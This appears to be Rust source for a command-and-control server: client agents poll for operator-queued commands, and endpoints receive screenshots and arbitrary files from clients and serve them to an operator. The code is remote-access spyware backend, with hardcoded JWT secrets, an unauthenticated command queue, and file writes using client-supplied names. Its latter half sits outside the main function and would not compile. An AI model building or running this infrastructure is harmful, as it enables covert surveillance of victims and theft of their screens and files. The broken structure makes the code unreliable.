use warp::Filter;
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use chrono::Utc;
use log::info;
use sqlx::sqlite::{SqlitePool, SqlitePoolOptions};
use sqlx::Row;

static JWT_KEYS: &[&[u8]] = &[b"super_jwt_secret_please_change", b"old_key_2024"];
static ALLOWED_IPS: &[&str] = &["127.0.0.1", "::1"];

#[derive(Debug, Deserialize)]
struct BehavioralPayload {
    jwt: String,
    behavioral_hash: String,
    events: Vec<String>,
}

#[derive(Debug, Serialize, Clone)]
struct Command {
    cmd: String,
    issued_at: i64,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    // Init SQLite DB for analytics and screenshots
    let db = SqlitePoolOptions::new()
        .max_connections(5)
        .connect("sqlite://analytics.db").await?;
    sqlx::query("CREATE TABLE IF NOT EXISTS events (hash TEXT, event TEXT, ts INTEGER)").execute(&db).await?;
    sqlx::query("CREATE TABLE IF NOT EXISTS screenshots (hash TEXT, filename TEXT, screen INTEGER, ts INTEGER)").execute(&db).await?;

    let commands: Arc<DashMap<String, Vec<Command>>> = Arc::new(DashMap::new());

    // Operator dashboard: GET /dashboard
    let dashboard = warp::path("dashboard")
        .and(warp::get())
        .map(move || warp::reply::html(include_str!("dashboard.html")));

    // POST /command (agent endpoint)
    let commands_clone = commands.clone();
    let db_filter = warp::any().map(move || db.clone());
    let api = warp::path("command")
        .and(warp::post())
        .and(warp::addr::remote())
        .and(warp::body::json())
        .and(db_filter.clone())
        .and_then(move |addr: Option<std::net::SocketAddr>, payload: BehavioralPayload, db: SqlitePool| {
            let commands = commands_clone.clone();
            async move {
                let ip_ok = addr
                    .map(|a| ALLOWED_IPS.contains(&a.ip().to_string().as_str()))
                    .unwrap_or(false);
                if !ip_ok {
                    return Ok::<_, warp::Rejection>(warp::reply::with_status(
                        "IP not allowed", warp::http::StatusCode::FORBIDDEN,
                    ));
                }
                let mut valid = false;
                for key in JWT_KEYS {
                    if jsonwebtoken::decode::<serde_json::Value>(
                        &payload.jwt,
                        &jsonwebtoken::DecodingKey::from_secret(key),
                        &jsonwebtoken::Validation::default(),
                    ).is_ok() {
                        valid = true;
                        break;
                    }
                }
                if !valid {
                    return Ok(warp::reply::with_status(
                        "JWT invalid", warp::http::StatusCode::UNAUTHORIZED,
                    ));
                }
                let now = Utc::now().timestamp();
                let nonce = format!("{}:{}", payload.behavioral_hash, now / 60);

                // Store events in DB
                for event in &payload.events {
                    sqlx::query("INSERT INTO events (hash, event, ts) VALUES (?, ?, ?)")
                        .bind(&payload.behavioral_hash)
                        .bind(event)
                        .bind(now)
                        .execute(&db).await.unwrap();
                }

                // Flexible commands: per-client queue
                let cmd = commands
                    .entry(payload.behavioral_hash.clone())
                    .or_insert_with(Vec::new)
                    .pop()
                    .unwrap_or(Command {
                        cmd: "ping".to_string(),
                        issued_at: now,
                    });

                info!("Served command to {}: {}", payload.behavioral_hash, cmd.cmd);
                Ok(warp::reply::json(&cmd))
            }
        });

    // Operator API: POST /queue (add command for client)
    let commands_clone2 = commands.clone();
    let queue = warp::path("queue")
        .and(warp::post())
        .and(warp::body::json())
        .map(move |cmd: serde_json::Value| {
            let hash = cmd["hash"].as_str().unwrap_or("").to_string();
            let command = cmd["cmd"].as_str().unwrap_or("ping").to_string();
            commands_clone2
                .entry(hash)
                .or_insert_with(Vec::new)
                .push(Command {
                    cmd: command,
                    issued_at: Utc::now().timestamp(),
                });
            warp::reply::with_status("Queued", warp::http::StatusCode::OK)
        });

    // Analytics: GET /analytics
    let db_filter2 = db.clone();
    let analytics_route = warp::path("analytics")
        .and(warp::get())
        .and_then(move || {
            let db = db_filter2.clone();
            async move {
                let rows = sqlx::query("SELECT hash, COUNT(*) as cnt FROM events GROUP BY hash")
                    .fetch_all(&db).await.unwrap();
                let mut map = serde_json::Map::new();
                for row in rows {
                    let hash: String = row.get("hash");
                    let cnt: i64 = row.get("cnt");
                    map.insert(hash, serde_json::json!(cnt));
                }
                Ok::<_, warp::Rejection>(warp::reply::json(&map))
            }
        });

    // Screenshot upload endpoint
    let db_filter3 = db.clone();
    let upload = warp::path("upload")
        .and(warp::post())
        .and(warp::header::<String>("authorization"))
        .and(warp::body::json())
        .and(db_filter3)
        .and_then(|auth: String, body: serde_json::Value, db: SqlitePool| async move {
            let jwt = auth.strip_prefix("Bearer ").unwrap_or("");
            let mut valid = false;
            for key in JWT_KEYS {
                if jsonwebtoken::decode::<serde_json::Value>(
                    jwt,
                    &jsonwebtoken::DecodingKey::from_secret(key),
                    &jsonwebtoken::Validation::default(),
                ).is_ok() {
                    valid = true;
                    break;
                }
            }
            if !valid {
                return Ok::<_, warp::Rejection>(warp::reply::with_status(
                    "JWT invalid", warp::http::StatusCode::UNAUTHORIZED,
                ));
            }
            let hash = body.get("hash").and_then(|v| v.as_str()).unwrap_or("unknown");
            let screen = body.get("screen").and_then(|v| v.as_u64()).unwrap_or(0);
            if let Some(image_b64) = body.get("image").and_then(|v| v.as_str()) {
                if let Ok(img_bytes) = base64::engine::general_purpose::STANDARD.decode(image_b64) {
                    let filename = format!("screenshot_{}_{}.png", chrono::Utc::now().timestamp(), screen);
                    tokio::fs::write(&filename, img_bytes).await.unwrap();
                    sqlx::query("INSERT INTO screenshots (hash, filename, screen, ts) VALUES (?, ?, ?, ?)")
                        .bind(hash)
                        .bind(&filename)
                        .bind(screen as i64)
                        .bind(chrono::Utc::now().timestamp())
                        .execute(&db).await.unwrap();
                    return Ok(warp::reply::with_status(
                        format!("Saved as {}", filename),
                        warp::http::StatusCode::OK,
                    ));
                }
            }
            Ok(warp::reply::with_status(
                "Invalid image", warp::http::StatusCode::BAD_REQUEST,
            ))
        });

    // Screenshot gallery endpoint
    let db_filter4 = db.clone();
    let shots = warp::path("shots")
        .and(warp::get())
        .and_then(move || {
            let db = db_filter4.clone();
            async move {
                let rows = sqlx::query("SELECT filename FROM screenshots ORDER BY ts DESC LIMIT 100")
                    .fetch_all(&db).await.unwrap();
                let files: Vec<String> = rows.into_iter().map(|row| row.get("filename")).collect();
                Ok::<_, warp::Rejection>(warp::reply::json(&files))
            }
        });

    // Alerts: GET /alerts (simple suspicious event alerting)
    let db_filter5 = db.clone();
    let alerts = warp::path("alerts")
        .and(warp::get())
        .and_then(move || {
            let db = db_filter5.clone();
            async move {
                // Example: alert if >5 screenshots from a single hash in last 10 min
                let rows = sqlx::query(
                    "SELECT hash, COUNT(*) as cnt FROM screenshots WHERE ts > ? GROUP BY hash HAVING cnt > 5"
                )
                .bind(chrono::Utc::now().timestamp() - 600)
                .fetch_all(&db).await.unwrap();
                let mut alerts = Vec::new();
                for row in rows {
                    let hash: String = row.get("hash");
                    let cnt: i64 = row.get("cnt");
                    alerts.push(format!("ALERT: {} screenshots from {} in last 10min", cnt, hash));
                }
                Ok::<_, warp::Rejection>(warp::reply::json(&alerts))
            }
        });

    // Serve static screenshots for gallery
    let static_shots = warp::fs::dir(".");

    let routes = dashboard
        .or(api)
        .or(queue)
        .or(analytics_route)
        .or(upload)
        .or(shots)
        .or(alerts)
        .or(static_shots);

    warp::serve(routes).run(([0, 0, 0, 0], 8443)).await;
    Ok(())
}

// File upload endpoint
let upload_file = warp::path("upload_file")
    .and(warp::post())
    .and(warp::header::<String>("authorization"))
    .and(warp::body::json())
    .and_then(|auth: String, body: serde_json::Value| async move {
        let jwt = auth.strip_prefix("Bearer ").unwrap_or("");
        let mut valid = false;
        for key in JWT_KEYS {
            if jsonwebtoken::decode::<serde_json::Value>(
                jwt,
                &jsonwebtoken::DecodingKey::from_secret(key),
                &jsonwebtoken::Validation::default(),
            ).is_ok() {
                valid = true;
                break;
            }
        }
        if !valid {
            return Ok::<_, warp::Rejection>(warp::reply::with_status(
                "JWT invalid", warp::http::StatusCode::UNAUTHORIZED,
            ));
        }
        let filename = body.get("filename").and_then(|v| v.as_str()).unwrap_or("file");
        if let Some(filedata) = body.get("filedata").and_then(|v| v.as_str()) {
            if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(filedata) {
                tokio::fs::write(&filename, bytes).await.unwrap();
                return Ok(warp::reply::with_status(
                    format!("Saved as {}", filename),
                    warp::http::StatusCode::OK,
                ));
            }
        }
        Ok(warp::reply::with_status(
            "Invalid file", warp::http::StatusCode::BAD_REQUEST,
        ))
    });

// File download endpoint (list files)
let files = warp::path("files")
    .and(warp::get())
    .and_then(|| async move {
        let mut files = Vec::new();
        if let Ok(mut entries) = tokio::fs::read_dir(".").await {
            while let Ok(Some(entry)) = entries.next_entry().await {
                let fname = entry.file_name();
                let fname = fname.to_string_lossy();
                if fname.ends_with(".zip") || fname.ends_with(".txt") || fname.ends_with(".log") || fname.ends_with(".pdf") || fname.ends_with(".png") || fname.ends_with(".jpg") {
                    files.push(fname.to_string());
                }
            }
        }
        Ok::<_, warp::Rejection>(warp::reply::json(&files))
    });

// Serve static files for download
let static_files = warp::fs::dir(".");

let routes = dashboard
    .or(api)
    .or(queue)
    .or(analytics_route)
    .or(upload)
    .or(shots)
    .or(alerts)
    .or(upload_file)
    .or(files)
    .or(static_files);
